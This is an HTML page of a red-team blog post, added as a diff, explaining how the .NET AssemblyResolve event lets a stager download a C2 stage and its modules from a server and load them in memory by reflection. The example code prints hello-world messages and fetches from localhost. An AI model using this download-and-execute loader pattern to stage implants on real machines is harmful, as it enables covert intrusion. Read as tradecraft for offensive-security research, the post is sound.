@@ -1,0 +1,233 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>AppDomain.AssemblyResolve - Offensive Defence</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.74.2" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://offensivedefence.co.uk/css/main.min.f90f5edd436ec7b74ad05479a05705770306911f721193e7845948fb07fe1335.css" />
+    <script src="https://kit.fontawesome.com/89e1a73a2b.js" crossorigin="anonymous"></script>
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="AppDomain.AssemblyResolve"/>
+<meta name="twitter:description" content="Intro Jean Maes posted a blog entitled &ldquo;A tale of .NET assemblies, cobalt strike size constraints, and reflection&rdquo;, which looked at how to use the AssemblyResolve event to locate .NET dependancies at runtime that were not already weaved into an assembly or located in the GAC.
+For a decent background, I encourage readers to review Jean&rsquo;s post. Since the author credits me for pointing them towards the event, I thought it would be informative to write about the scenario under which I came across it."/>
+
+    <meta property="og:title" content="AppDomain.AssemblyResolve" />
+<meta property="og:description" content="Intro Jean Maes posted a blog entitled &ldquo;A tale of .NET assemblies, cobalt strike size constraints, and reflection&rdquo;, which looked at how to use the AssemblyResolve event to locate .NET dependancies at runtime that were not already weaved into an assembly or located in the GAC.
+For a decent background, I encourage readers to review Jean&rsquo;s post. Since the author credits me for pointing them towards the event, I thought it would be informative to write about the scenario under which I came across it." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://offensivedefence.co.uk/posts/assembly-resolve/" />
+<meta property="article:published_time" content="2020-12-21T12:06:54+00:00" />
+<meta property="article:modified_time" content="2020-12-21T12:06:54+00:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://offensivedefence.co.uk"><img class="app-header-avatar" src="/avatar.png" alt="John Doe" /></a>
+      <h1>Offensive Defence</h1>
+      <p>&#34;The hand which strikes also blocks.&#34;</p>
+
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">AppDomain.AssemblyResolve</h1>
+      <div class="post-meta">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
+  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg>
+              <a class="tag" href="https://offensivedefence.co.uk/authors/rastamouse/">Rasta Mouse</a>
+        
+      
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Dec 21, 2020
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div></div>
+    </header>
+    <div class="post-content">
+      <h3 id="intro">Intro</h3>
+<p><a href="https://twitter.com/Jean_Maes_1994">Jean Maes</a> posted a blog entitled &ldquo;<a href="https://redteamer.tips/a-tale-of-net-assemblies-cobalt-strike-size-constraints-and-reflection/">A tale of .NET assemblies, cobalt strike size constraints, and reflection</a>&rdquo;, which looked at how to use the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.appdomain.assemblyresolve?view=net-5.0">AssemblyResolve</a> event to locate .NET dependancies at runtime that were not already weaved into an assembly or located in the <a href="https://docs.microsoft.com/en-us/dotnet/framework/app-domains/gac">GAC</a>.</p>
+<p>For a decent background, I encourage readers to review Jean&rsquo;s post.  Since the author credits me for pointing them towards the event, I thought it would be informative to write about the scenario under which I came across it.</p>
+<h3 id="net-stagers-stages-and-modules">.NET &ldquo;Stagers&rdquo;, &ldquo;Stages&rdquo; and &ldquo;Modules&rdquo;</h3>
+<p>It all started one sunny morning (although I live in the UK so let&rsquo;s face it, it was probably raining) when I was thinking about how I could implement stagers and modules in <a href="https://github.com/SharpC2/SharpC2">SharpC2</a> (my .NET C2 framework).  I won&rsquo;t use the SharpC2 codebase because it&rsquo;s a little too much to get into just for the purposes of this post, so I&rsquo;ll use some more simplistic examples instead.</p>
+<p>The &ldquo;stage&rdquo; or &ldquo;implant&rdquo; is the main payload that contains all the functionality and logic we need to operate on a compromised machine.  At a minimum, this probably includes the ability to talk to a server, retrieve jobs, execute those jobs and send the results back.  One challenge with implants is that the more complex they become, the larger their filesize and the harder they become to deliver (e.g. during initial compromise).  Stagers are one solution to this problem - as they are tiny programs that can be delivered with the sole responsibility of pulling and loading the main stage.</p>
+<p>Let&rsquo;s write a very simpe stage and stager:</p>
+<h4 id="stage-net-class-library">Stage (.NET Class Library)</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">using</span> System;
+
+<span style="color:#66d9ef">namespace</span> Stage
+{
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">StageEntry</span>
+    {
+        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Execute()
+        {
+            Console.WriteLine(<span style="color:#e6db74">&#34;[+] Hello from Stage&#34;</span>);
+        }
+    }
+}
+</code></pre></div><h4 id="stager-net-console-application">Stager (.NET Console Application)</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">using</span> System;
+<span style="color:#66d9ef">using</span> System.Net;
+<span style="color:#66d9ef">using</span> System.Reflection;
+
+<span style="color:#66d9ef">namespace</span> Stager
+{
+    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
+    {
+        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
+        {
+            Console.WriteLine(<span style="color:#e6db74">&#34;[+] Hello from Stager&#34;</span>);
+            Console.WriteLine(<span style="color:#e6db74">&#34;[+] Loading Stage...&#34;</span>);
+
+            <span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> client = <span style="color:#66d9ef">new</span> WebClient())
+            {
+                <span style="color:#66d9ef">var</span> uri = <span style="color:#66d9ef">new</span> Uri(<span style="color:#e6db74">&#34;http://localhost:8000/stage.dll&#34;</span>);
+                <span style="color:#66d9ef">var</span> stage = client.DownloadData(uri);
+                <span style="color:#66d9ef">var</span> asm = Assembly.Load(stage);
+                asm.GetType(<span style="color:#e6db74">&#34;Stage.StageEntry&#34;</span>).GetMethod(<span style="color:#e6db74">&#34;Execute&#34;</span>).Invoke(<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">object</span>[] { });
+            }
+        }
+    }
+}
+</code></pre></div><p>This works as expected - the stager downloads and executes the stage.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;Stager.exe
+[+] Hello from Stager
+[+] Loading Stage...
+[+] Hello from Stage
+</code></pre></div><p>Now, one of the design decisions that were made regarding the SharpC2 implant was to make it extensible at runtime.  If the operator needed to push some new capability that was not &ldquo;native&rdquo; to the implant, then we wanted a means to provide that functionality.  To that end, we designed an interface on the implant that 3rd party modules could implement.</p>
+<h4 id="module-net-class-library">Module (.NET Class Library)</h4>
+<p>The exact implemention of the interface is not important - to demonstrate, we can use:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">namespace</span> Stage
+{
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">interface</span> IAgentModule
+    {
+        <span style="color:#66d9ef">void</span> Test();
+    }
+}
+</code></pre></div><p>Then the module would look like this (note that it&rsquo;s a separate project in Visual Studio with a reference to the Stage project):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">using</span> Stage;
+<span style="color:#66d9ef">using</span> System;
+
+<span style="color:#66d9ef">namespace</span> Module
+{
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AgentModule</span> : IAgentModule
+    {
+        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> Test()
+        {
+            Console.WriteLine(<span style="color:#e6db74">&#34;[+] Hello from Module&#34;</span>);
+        }
+    }
+}
+</code></pre></div><p>We shall now change the <code>Execute</code> method within the stage to:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Execute()
+{
+    Console.WriteLine(<span style="color:#e6db74">&#34;[+] Hello from Stage&#34;</span>);
+    Console.WriteLine(<span style="color:#e6db74">&#34;[+] Loading Module...&#34;</span>);
+
+    <span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> client = <span style="color:#66d9ef">new</span> WebClient())
+    {
+        <span style="color:#66d9ef">var</span> uri = <span style="color:#66d9ef">new</span> Uri(<span style="color:#e6db74">&#34;http://localhost:8000/module.dll&#34;</span>);
+        <span style="color:#66d9ef">var</span> bytes = client.DownloadData(uri);
+
+        <span style="color:#66d9ef">var</span> asm = Assembly.Load(bytes);
+        <span style="color:#66d9ef">var</span> instance = asm.CreateInstance(<span style="color:#e6db74">&#34;Module.AgentModule&#34;</span>, <span style="color:#66d9ef">true</span>);
+
+        <span style="color:#66d9ef">if</span> (instance <span style="color:#66d9ef">is</span> IAgentModule module)
+        {
+            module.Test();
+        }
+        <span style="color:#66d9ef">else</span>
+        {
+            Console.WriteLine(<span style="color:#e6db74">&#34;[-] Module does not implement IAgentModule&#34;</span>);
+        }
+    }
+}
+</code></pre></div><p>However, if we run the stager, we get the following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;Stager.exe
+[+] Hello from Stager
+[+] Loading Stage...
+[+] Hello from Stage
+[+] Loading Module...
+[-] Module does not implement IAgentModule
+</code></pre></div><h3 id="appdomainassemblyresolve">AppDomain.AssemblyResolve</h3>
+<p>It appears that the assembly is failing to locate <code>IAgentModule</code>, and this is finally where we get to the <code>AssemblyResolve</code> event.  If we place a breakpoint around <code>if (asm is IAgentModule)</code>, we can use the Immediate Window in Visual Studio to do some poking around.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Assembly.GetCallingAssembly().FullName
+&#34;Stager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&#34;
+
+AppDomain.CurrentDomain.FriendlyName
+&#34;Stager.exe&#34;
+</code></pre></div><p>We can see that our current AppDomain is that of stager.exe and stager is the current calling assembly.  Since the <code>IAgentInterface</code> is part of the <strong>stage</strong>, this explains why the resolution is failing.  All we have to do is register the AssemblyResolve callback to get an instance of the stage assembly where resolution will succeed.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">AppDomain.CurrentDomain.AssemblyResolve += AssemblyResolveCallback;
+</code></pre></div><p>And the method to handle this callback:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">static</span> Assembly AssemblyResolveCallback(<span style="color:#66d9ef">object</span> sender, ResolveEventArgs args) =&gt; Assembly.GetExecutingAssembly();
+</code></pre></div><p>Even though stager is the calling assembly, stage is the executing assembly.  The stage in full is now:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">using</span> System;
+<span style="color:#66d9ef">using</span> System.Net;
+<span style="color:#66d9ef">using</span> System.Reflection;
+
+<span style="color:#66d9ef">namespace</span> Stage
+{
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">StageEntry</span>
+    {
+        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Execute()
+        {
+            Console.WriteLine(<span style="color:#e6db74">&#34;[+] Hello from Stage&#34;</span>);
+            Console.WriteLine(<span style="color:#e6db74">&#34;[+] Loading Module...&#34;</span>);
+
+            <span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> client = <span style="color:#66d9ef">new</span> WebClient())
+            {
+                <span style="color:#66d9ef">var</span> uri = <span style="color:#66d9ef">new</span> Uri(<span style="color:#e6db74">&#34;http://localhost:8000/module.dll&#34;</span>);
+                <span style="color:#66d9ef">var</span> bytes = client.DownloadData(uri);
+
+                AppDomain.CurrentDomain.AssemblyResolve += AssemblyResolveCallback;
+
+                <span style="color:#66d9ef">var</span> asm = Assembly.Load(bytes);
+                <span style="color:#66d9ef">var</span> instance = asm.CreateInstance(<span style="color:#e6db74">&#34;Module.AgentModule&#34;</span>, <span style="color:#66d9ef">true</span>);
+
+                <span style="color:#66d9ef">if</span> (instance <span style="color:#66d9ef">is</span> IAgentModule module)
+                {
+                    module.Test();
+                }
+                <span style="color:#66d9ef">else</span>
+                {
+                    Console.WriteLine(<span style="color:#e6db74">&#34;[-] Module does not implement IAgentModule&#34;</span>);
+                }
+            }
+        }
+
+        <span style="color:#66d9ef">static</span> Assembly AssemblyResolveCallback(<span style="color:#66d9ef">object</span> sender, ResolveEventArgs args) =&gt; Assembly.GetExecutingAssembly();
+    }
+}
+</code></pre></div><p>And now we get:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;Stager.exe
+[+] Hello from Stager
+[+] Loading Stage...
+[+] Hello from Stage
+[+] Loading Module...
+[+] Hello from Module
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
